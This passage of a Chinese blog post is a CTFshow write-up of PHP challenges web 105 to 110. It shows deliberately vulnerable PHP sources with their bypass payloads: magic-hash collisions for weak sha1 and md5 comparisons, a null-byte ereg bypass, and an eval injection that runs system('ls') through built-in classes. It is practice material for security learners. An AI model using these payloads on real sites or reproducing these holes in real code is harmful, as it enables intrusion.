+echo &quot;your are good&quot;.$flag.&quot;\n&quot;;
+die($suces);
+
+?&gt;</code></pre>
+
+<blockquote>
+<p><strong>下面是我写的时候的错误理解</strong></p>
+<p>这里有一个特殊的语法 <code>$$key=$$value;</code> 这个是可变变量的语法</p>
+<pre class="line-numbers language-php" data-language="php" data-start="1"><code class="language-php">$a &#x3D; &quot;123&quot;;
+$b &#x3D; &#39;a&#39;;
+
+echo $$b;    &#x2F;&#x2F; 123</code></pre>
+
+<p>这里会把 b 变量中的值当作一个变量名</p>
+<pre class="line-numbers language-php" data-language="php" data-start="1"><code class="language-php">$a &#x3D; &quot;123&quot;;
+$b &#x3D; &#39;a&#39;;
+$key &#x3D; &#39;a&#39;;
+$value &#x3D; &#39;b&#39;;
+
+$$key &#x3D; $$value;
+echo $a;    &#x2F;&#x2F; a</code></pre>
+
+<p>这里将 key 指向的变量 a 赋值给 value 指向的变量 b 的值，所以最后变为了 a</p>
+</blockquote>
+<p>难绷，搞错了 <code>$$key=$$value;</code>​ 其实是把 <code>$key</code>​ 和 <code>$value</code> 值代入而已</p>
+<p>所以第一个让 <code>suces=flag</code>​ 第二个让 <code>error=suces</code>​ 就能将 <code>error = flag</code> </p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/network-asset-20250522223711-20260228215601-qn31wny.png" alt="image"></p>
+<p>‍</p>
+<h3 id="web-106"><a href="#web-106" class="headerlink" title="web 106"></a>web 106</h3><pre class="line-numbers language-php" data-language="php" data-start="1"><code class="language-php">&lt;?php
+highlight_file(__FILE__);
+include(&quot;flag.php&quot;);
+
+if(isset($_POST[&#39;v1&#39;]) &amp;&amp; isset($_GET[&#39;v2&#39;]))&#123;
+    $v1 &#x3D; $_POST[&#39;v1&#39;];
+    $v2 &#x3D; $_GET[&#39;v2&#39;];
+    if(sha1($v1)&#x3D;&#x3D;sha1($v2) &amp;&amp; $v1!&#x3D;$v2)&#123;
+        echo $flag;
+    &#125;
+&#125;
+?&gt;</code></pre>
+
+<p><a href="#20260301143303-w8ia1km">web 104</a> 的修复</p>
+<p>在网上找到的 sha1 值，这里是弱比较，很好绕过</p>
+<pre class="line-numbers language-none" data-start="1"><code class="language-none">10932435112: 0e07766915004133176347055865026311692244
+aaroZmOk: 0e66507019969427134894567494305185566735
+aaK1STfY: 0e76658526655756207688271159624026011393
+aaO8zKZF: 0e89257456677279068558073954252716165668
+aa3OFF9m: 0e36977786278517984959260394024281014729
+0e1290633704: 0e19985187802402577070739524195726831799</code></pre>
+
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/network-asset-20250522225453-20260228215602-x5irq92.png" alt="image"></p>
+<p>‍</p>
+<h3 id="web-107"><a href="#web-107" class="headerlink" title="web 107"></a>web 107</h3><pre class="line-numbers language-php" data-language="php" data-start="1"><code class="language-php">&lt;?php
+
+highlight_file(__FILE__);
+error_reporting(0);
+include(&quot;flag.php&quot;);
+
+if(isset($_POST[&#39;v1&#39;]))&#123;
+    $v1 &#x3D; $_POST[&#39;v1&#39;];
+    $v3 &#x3D; $_GET[&#39;v3&#39;];
+       parse_str($v1,$v2);
+       if($v2[&#39;flag&#39;]&#x3D;&#x3D;md5($v3))&#123;
+           echo $flag;
+       &#125;
+
+&#125;
+?&gt;</code></pre>
+
+<p><code>parse_str</code> 函数是将第一个参数分解变量存入第二个参数，第二个参数会是一个数组</p>
+<pre class="line-numbers language-php" data-language="php" data-start="1"><code class="language-php">&lt;?php
+
+$v1 &#x3D; &quot;flag&#x3D;1&quot;;
+parse_str($v1, $v2);
+echo $v2[&#39;flag&#39;];    &#x2F;&#x2F; 1</code></pre>
+
+<p>然后后面就是传入一个md5值，其实这个随便什么都行，反正自己 md5 加密一下取前面的数字放到 flag 中就行</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/network-asset-20250522230133-20260228215602-0ntil1z.png" alt="image"></p>
+<pre class="line-numbers language-none" data-start="1"><code class="language-none">240610708:0e462097431906509019562988736854
+QLTHNDT:0e405967825401955372549139051580
+QNKCDZO:0e830400451993494058024219903391
+PJNPDWY:0e291529052894702774557631701704
+NWWKITQ:0e763082070976038347657360817689
+NOOPCJF:0e818888003657176127862245791911
+MMHUWUV:0e701732711630150438129209816536
+MAUXXQC:0e478478466848439040434801845361</code></pre>
+
+<p>‍</p>
+<h3 id="web-108"><a href="#web-108" class="headerlink" title="web 108"></a>web 108</h3><pre class="line-numbers language-php" data-language="php" data-start="1"><code class="language-php">&lt;?php
+
+highlight_file(__FILE__);
+error_reporting(0);
+include(&quot;flag.php&quot;);
+
+if (ereg (&quot;^[a-zA-Z]+$&quot;, $_GET[&#39;c&#39;])&#x3D;&#x3D;&#x3D;FALSE)  &#123;
+    die(&#39;error&#39;);
+
+&#125;
+&#x2F;&#x2F;只有36d的人才能看到flag
+if(intval(strrev($_GET[&#39;c&#39;]))&#x3D;&#x3D;0x36d)&#123;
+    echo $flag;
+&#125;
+
+?&gt;</code></pre>
+
+<p>这里是 <code>ereg</code>​ 的问题，这个函数可以被 null 截断，<code>strrev</code> 是反转函数，所以把 36d 的十进制反转一下就行</p>
+<pre class="line-numbers language-php" data-language="php" data-start="1"><code class="language-php">?c&#x3D;a%00778</code></pre>
+
+<p>‍</p>
+<h3 id="web-109"><a href="#web-109" class="headerlink" title="web 109"></a>web 109</h3><pre class="line-numbers language-php" data-language="php" data-start="1"><code class="language-php">&lt;?php
+
+highlight_file(__FILE__);
+error_reporting(0);
+if(isset($_GET[&#39;v1&#39;]) &amp;&amp; isset($_GET[&#39;v2&#39;]))&#123;
+    $v1 &#x3D; $_GET[&#39;v1&#39;];
+    $v2 &#x3D; $_GET[&#39;v2&#39;];
+
+    if(preg_match(&#39;&#x2F;[a-zA-Z]+&#x2F;&#39;, $v1) &amp;&amp; preg_match(&#39;&#x2F;[a-zA-Z]+&#x2F;&#39;, $v2))&#123;
+            eval(&quot;echo new $v1($v2());&quot;);
+    &#125;
+
+&#125;
+?&gt;</code></pre>
+
+<p>参考<a target="_blank" rel="noopener" href="https://www.cnblogs.com/GCom/p/17738963.html">《CTFshow-Web入门》10. Web 91~110 - 镜坛主 - 博客园</a></p>
+<p>这里因为有 <code>echo</code>​ 并且这里有个 <code>new</code>​ 所以可以创建一个 php 的内置类，触发 <code>__tostring</code>  函数，然后就可以输出这个对象包含的数据</p>
+<blockquote>
+<p><code>__toString</code> : 当一个对象被当作字符串对待时，就会触发这个魔术方法，格式化输出这个对象包含的数据</p>
+<ul>
+<li>只要变量后面紧跟着()，就会对这个变量作为函数进行调用</li>
+</ul>
+</blockquote>
+<p>随便试点内置类，只要包含 <code>__toString</code> 方法就行</p>
+<pre class="line-numbers language-php" data-language="php" data-start="1"><code class="language-php">?v1&#x3D;DirectoryIterator&amp;v2&#x3D;system(&#39;ls&#39;)</code></pre>
+
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/network-asset-20250522232830-20260228215602-rj1ks74.png" alt="image"></p>
+<p>‍</p>
+<h3 id="web-110"><a href="#web-110" class="headerlink" title="web 110"></a>web 110</h3><pre class="line-numbers language-php" data-language="php" data-start="1"><code class="language-php">&lt;?php
+highlight_file(__FILE__);
+error_reporting(0);
+if(isset($_GET[&#39;v1&#39;]) &amp;&amp; isset($_GET[&#39;v2&#39;]))&#123;
+    $v1 &#x3D; $_GET[&#39;v1&#39;];
+    $v2 &#x3D; $_GET[&#39;v2&#39;];
+
+    if(preg_match(&#39;&#x2F;\~|\&#96;|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\&#x3D;|\&#123;|\[|\;|\:|\&quot;|\&#39;|\,|\.|\?|\\\\|\&#x2F;|[0-9]&#x2F;&#39;, $v1))&#123;
+            die(&quot;error v1&quot;);
+    &#125;
+    if(preg_match(&#39;&#x2F;\~|\&#96;|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\&#x3D;|\&#123;|\[|\;|\:|\&quot;|\&#39;|\,|\.|\?|\\\\|\&#x2F;|[0-9]&#x2F;&#39;, $v2))&#123;
+            die(&quot;error v2&quot;);
+    &#125;
+
+    eval(&quot;echo new $v1($v2());&quot;);
+
+&#125;
+
+?&gt;</code></pre>
+
+<p>方法是一样的，只是符号被过滤了，所以用不了之前的方法</p>
+<p>这里学到了php中查看目录的函数：<code>golb()</code>​、<code>getcwd()</code>​、 <code>basename()</code>​、<code>realpath()</code>​、<code>scandir()</code>​<br>但是里面只有 <code>getcwd</code> 不需要参数，直接返回当前工作目录</p>
+<pre class="line-numbers language-php" data-language="php" data-start="1"><code class="language-php">?v1&#x3D;FilesystemIterator&amp;v2&#x3D;getcwd</code></pre>
+
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/network-asset-20250709194921-20260228215602-4xrtsq7.png" alt="image"></p>
+<p>因为是当前目录，直接访问就行</p>
+
+                
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/about" rel="external nofollow noreferrer">Marin</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="https://wwwmarin.xyz/2025/05/20/php-te-xing/">https://wwwmarin.xyz/2025/05/20/php-te-xing/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="/about" target="_blank">Marin</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/web/">
+                                    <span class="chip bg-color">web</span>
+                                </a>
+                            
+                                <a href="/tags/%E5%88%B7%E9%A2%98/">
+                                    <span class="chip bg-color">刷题</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+                <div id="reward">
+    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>
+
+    <!-- Modal Structure -->
+    <div id="rewardModal" class="modal">
+        <div class="modal-content">
+            <a class="close modal-close"><i class="fas fa-times"></i></a>
+            <h4 class="reward-title">你的赏识是我前进的动力</h4>
+            <div class="reward-content">
+                <div class="reward-tabs">
+                    <ul class="tabs row">
+                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
+                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
+                    </ul>
+                    <div id="alipay">
+                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
+                    </div>
+                    <div id="wechat">
+                        <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    $(function () {
+        $('.tabs').tabs();
+    });
+</script>
+
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+            <div class="card">
+                <a href="/2025/07/31/linux/">
+                    <div class="card-image">
+                        
+                        <img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/A49509B4D767F4369527F90DE4678504.jpg" class="responsive-img" alt="linux 基础">
+                        
+                        <span class="card-title">linux 基础</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2025-07-31
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/linux/" class="post-category">
+                                    linux
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/linux/">
+                        <span class="chip bg-color">linux</span>
+                    </a>
+                    
+                    <a href="/tags/%E5%9F%BA%E7%A1%80/">
+                        <span class="chip bg-color">基础</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2025/05/15/ming-ling-zhi-xing/">
+                    <div class="card-image">
+                        
+                        <img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/20240312_124030.jpg" class="responsive-img" alt="CTFSHOW-命令执行">
+                        
+                        <span class="card-title">CTFSHOW-命令执行</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2025-05-15
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/CTFSHOW/" class="post-category">
+                                    CTFSHOW
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/web/">
+                        <span class="chip bg-color">web</span>
+                    </a>
+                    
+                    <a href="/tags/%E5%88%B7%E9%A2%98/">
+                        <span class="chip bg-color">刷题</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+
+  <!-- 是否加载使用自带的 prismjs. -->
+  <script type="text/javascript" src="/libs/prism/prism.min.js"></script>
+
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget card" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h2, h3, h4, h5, h6'
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+
+    <div class="container row center-align"
+         style="margin-bottom: 0px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            
+                <span id="year">2019-2026</span>
+            
+            <a href="/about" target="_blank">Marin</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            
+            <br>
+            
+            
+            
+                
+            
+            
+                <span id="busuanzi_container_site_pv">
+                &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;
+                    <span id="busuanzi_value_site_pv" class="white-color"></span>
+            </span>
+            
+            
+                <span id="busuanzi_container_site_uv">
+                &nbsp;|&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;
+                    <span id="busuanzi_value_site_uv" class="white-color"></span>
+            </span>
+            
+            <br>
+
+            <!-- 运行天数提醒. -->
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script type="text/javascript">
+$(function () {
+    var searchFunc = function (path, search_id, content_id) {
+        'use strict';
+        $.ajax({
+            url: path,
+            dataType: "xml",
+            success: function (xmlResponse) {
+                // get the contents from search data
+                var datas = $("entry", xmlResponse).map(function () {
+                    return {
+                        title: $("title", this).text(),
+                        content: $("content", this).text(),
+                        url: $("url", this).text()
+                    };
+                }).get();
+                var $input = document.getElementById(search_id);
+                var $resultContent = document.getElementById(content_id);
+                $input.addEventListener('input', function () {
+                    var str = '<ul class=\"search-result-list\">';
+                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                    $resultContent.innerHTML = "";
+                    if (this.value.trim().length <= 0) {
+                        return;
+                    }
+                    // perform local searching
+                    datas.forEach(function (data) {
+                        var isMatch = true;
+                        var data_title = data.title.trim().toLowerCase();
+                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                        var data_url = data.url;
+                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
+                        var index_title = -1;
+                        var index_content = -1;
+                        var first_occur = -1;
+                        // only match artiles with not empty titles and contents
+                        if (data_title !== '' && data_content !== '') {
+                            keywords.forEach(function (keyword, i) {
+                                index_title = data_title.indexOf(keyword);
+                                index_content = data_content.indexOf(keyword);
+                                if (index_title < 0 && index_content < 0) {
+                                    isMatch = false;
+                                } else {
+                                    if (index_content < 0) {
+                                        index_content = 0;
+                                    }
+                                    if (i === 0) {
+                                        first_occur = index_content;
+                                    }
+                                }
+                            });
+                        }
+                        // show search results
+                        if (isMatch) {
+                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
+                            var content = data.content.trim().replace(/<[^>]+>/g, "");
+                            if (first_occur >= 0) {
+                                // cut out 100 characters
+                                var start = first_occur - 20;
+                                var end = first_occur + 80;
+                                if (start < 0) {
+                                    start = 0;
+                                }
+                                if (start === 0) {
+                                    end = 100;
+                                }
+                                if (end > content.length) {
+                                    end = content.length;
+                                }
+                                var match_content = content.substr(start, end);
+                                // highlight all keywords
+                                keywords.forEach(function (keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
+                                });
+
+                                str += "<p class=\"search-result\">" + match_content + "...</p>"
+                            }
+                            str += "</li>";
+                        }
+                    });
+                    str += "</ul>";
+                    $resultContent.innerHTML = str;
+                });
+            }
+        });
+    };
+
+    searchFunc('/search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 白天和黑夜主题 -->
+<div class="stars-con">
+    <div id="stars"></div>
+    <div id="stars2"></div>
+    <div id="stars3"></div>  
+</div>
+
+<script>
+    function switchNightMode() {
+        $('<div class="Cuteen_DarkSky"><div class="Cuteen_DarkPlanet"></div></div>').appendTo($('body')),
+        setTimeout(function () {
+            $('body').hasClass('DarkMode') 
+            ? ($('body').removeClass('DarkMode'), localStorage.setItem('isDark', '0'), $('#sum-moon-icon').removeClass("fa-sun").addClass('fa-moon')) 
+            : ($('body').addClass('DarkMode'), localStorage.setItem('isDark', '1'), $('#sum-moon-icon').addClass("fa-sun").removeClass('fa-moon')),
+            
+            setTimeout(function () {
+            $('.Cuteen_DarkSky').fadeOut(1e3, function () {
+                $(this).remove()
+            })
+            }, 2e3)
+        })
+    }
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    
+
+    
+    
+    
+
+    <!-- 雪花特效 -->
+    
+
+    <!-- 鼠标星星特效 -->
+    
+
+     
+        <script src="https://ssl.captcha.qq.com/TCaptcha.js"></script>
+        <script src="/libs/others/TencentCaptcha.js"></script>
+        <button id="TencentCaptcha" data-appid="xxxxxxxxxx" data-cbfn="callback" type="button" hidden></button>
+    
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+    <!--腾讯兔小巢-->
+    
+    
+
+    
+
+    
+
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+</body>
+
+</html>
